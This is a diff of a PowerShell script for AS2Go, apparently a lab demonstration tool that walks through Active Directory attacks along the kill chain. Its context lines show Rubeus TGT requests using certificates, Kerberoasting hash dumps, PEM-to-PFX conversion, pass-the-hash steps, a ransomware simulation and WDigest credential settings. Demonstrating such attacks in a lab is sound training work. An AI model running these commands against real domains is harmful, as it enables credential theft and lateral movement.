@@ -1,4 +1,4 @@
-<#
+﻿<#
 .SYNOPSIS
 
 Attack scenario to GO - along the kill-chain (AS2Go)
@@ -90,8 +90,8 @@ Param (
 [bool]$showStep = $true # show the steps in an image
 [bool]$skipstep = $false # show the steps in an image
 
-$lastupdate = "2022-11-27"
-$version = "2.5.9.0" 
+$lastupdate = "2022-12-01"
+$version = "2.6.0" 
 $path = Get-Location
 $scriptName = $MyInvocation.MyCommand.Name
 $scriptLog = "$path\$scriptName.log"
@@ -172,6 +172,10 @@ function MyTemplate {
 
     return $true
 }
+
+
+
+#region AS2Go0 Functions
 
 function Get-ComputerInformation {
 
@@ -262,7 +266,6 @@ Function Reset-Password {
     Write-Log -Message "### End Function $myfunction ###"
 }
 
-
 function Set-StandCommandColors {
 
     ################################################################################
@@ -290,7 +293,6 @@ function Set-StandCommandColors {
 
     return $true
 }
-
 
 function Get-ADGroupNameBasedOnSIDSuffix {
 
@@ -330,9 +332,6 @@ function Get-ADGroupNameBasedOnSIDSuffix {
     return $GroupName
 }
 
-#region AS2Go0 Functions
-
-
 function Write-Highlight {
 
     ################################################################################
@@ -356,7 +355,6 @@ function Write-Highlight {
     #endregion ####################### main code #########################
     Write-Log -Message "### End Function $myfunction ###"
 }
-
 
 function Get-KerberosTGT {
 
@@ -390,7 +388,7 @@ function Get-KerberosTGT {
     
 
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ".\Rubeus.exe ","asktgt /user:", $altname, " /certificate:",$pfxFile, " /ppt"  `
+    Write-Highlight -Text ".\Rubeus.exe ","asktgt /user:","$altname", " /certificate:","$pfxFile", " /ppt"  `
                     -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
     Write-Host ""
     Write-Log -Message $request
@@ -412,7 +410,7 @@ function Get-KerberosTGT {
     Clear-Host
 
 
- 
+
 
     klist
     pause
@@ -439,7 +437,13 @@ function Start-ConvertingToPfxFromPem {
     Write-Log -Message "### Start Function $myfunction ###"
     #region ################## main code | out- host #####################
 
+    Write-Log -Message  $pemFile
+    
+    
     $PfxFile = $pemFile.tolower().Replace("pem", "pfx")
+
+
+    Write-Log -Message  $PfxFile
 
     $convert = "openssl pkcs12 -in $pemFile -keyex -CSP ""Microsoft Enhanced Cryptographic Provider v1.0"" -export -out $pfxFile"
     Write-Log -Message  $convert
@@ -459,11 +463,10 @@ function Start-ConvertingToPfxFromPem {
         Write-Output $convert  | clip
     }
  
-    $StartOpenSSL = Get-KeyValue -key "OpenSSL"
-    Start-Process -filePath $StartOpenSSL
-    
+    Write-Host ""
     Write-Host "Next steps:" -ForegroundColor $fgcH
     Write-Host "-----------" -ForegroundColor $fgcH
+    Write-Host ""
     Write-Host " - Change to console "  -NoNewline; Write-Host "Win64 OpenSSL Command Prompt" -ForegroundColor $fgcH
     Write-Host " - Change directory to C:\temp\AS2GO"
     Write-Host " - Paste the command into the OpenSSL Command Prompt"
@@ -670,12 +673,12 @@ function Start-KerberoastingAttack {
     #####
 
     $myDomain = $env:USERDNSDOMAIN
-    $hashes = "$myDomain.hashes.txt"
+    $hashes = "KR-$myDomain.hashes.txt"
 
 
     # example: .\Rubeus.exe kerberoast /domain:SANDBOX.CORP /outfile:.\SANDBOX.CORP.hashes.txt
     Write-Host      -NoNewline "  Command: "
-    Write-Highlight -Text ".\Rubeus.exe ", "kerberoast ","/domain:", $myDomain, " /outfile:.\", $hashes `
+    Write-Highlight -Text ".\Rubeus.exe ", "kerberoast ","/domain:","$myDomain", " /outfile:.\","$hashes" `
                     -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV
 
     Write-Log -Message "     >> .\$RUBEUS kerberoast /domain:$myDomain /outfile:.\$hashes"
@@ -903,7 +906,7 @@ function SimulateRansomare {
 
     #prepare the simulation
     $path = Get-Location
-    $filePrefix = (Get-Date).toString("yyyyMMdd_HHmmss")
+    $filePrefix = "RW-" + (Get-Date).toString("yyyyMMdd_HHmmss")
 
     #create temp directory and fill the directory
     $FolderToEncrypt = "$BackupShare\$env:USERNAME"
@@ -1445,6 +1448,16 @@ function Stop-AS2GoDemo {
     Write-Log -Message "End Time  : $EndDate"
     Write-Log -Message "Total Time: $duration"
 
+    # clean-up AS2Go Folder
+    New-Item -Path ".\Clean-up" -ItemType Directory  -ErrorAction Ignore | Out-Null
+    try
+    {
+    Get-ChildItem ??-*.* | Move-Item -Destination ".\Clean-up" -Force | Out-Null
+    }
+    catch
+    {
+    }
+
     Invoke-Item $scriptLog
     Invoke-Item .\step_020.html
 
@@ -1691,9 +1704,6 @@ Function Get-Answer {
 
     return $prompt.ToUpper()
 }
-
-
-
 
 Function Get-KeyValue {
 
@@ -1986,7 +1996,7 @@ function Start-PtH-Attack {
     Write-Host ""
     Get-SensitveADUser -group $globalHelpDesk
     Pause
-    Invoke-Item .\POI.png
+    If ($showStep) { Show-Step -step "step_poi.html" }
     pause
     Clear-Host
 
@@ -2420,8 +2430,6 @@ Function Show-Step {
 
     Invoke-Item ".\$step"
     #& $OpenSSL "$path\$step"
-
-
 }
 
 function Get-FileVersion{
@@ -3440,7 +3448,7 @@ Function Start-AS2GoDemo {
     Stop-AS2GoDemo
 
 
-    <# Ideen 
+ <# Ideen 
 
 
 enter-pssession -ComputerName Ch01-DSP-MGMT
@@ -3458,7 +3466,6 @@ catch
 Write-Host Get-ItemPropertyValue : Property UseLogonCredential does not exist at path -ForegroundColor yellow
 }
 
-
 try
 {
 $UseLogonCredential = Get-ItemPropertyValue -Name UseLogonCredential -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
@@ -3468,7 +3475,7 @@ catch
 Write-Host Get-ItemPropertyValue : Property UseLogonCredential does not exist at path -ForegroundColor yellow
 }
 
-
+Get-ChildItem ??-*.* | Move-Item -Destination .\Clean-up -Force
 
 #>
 }
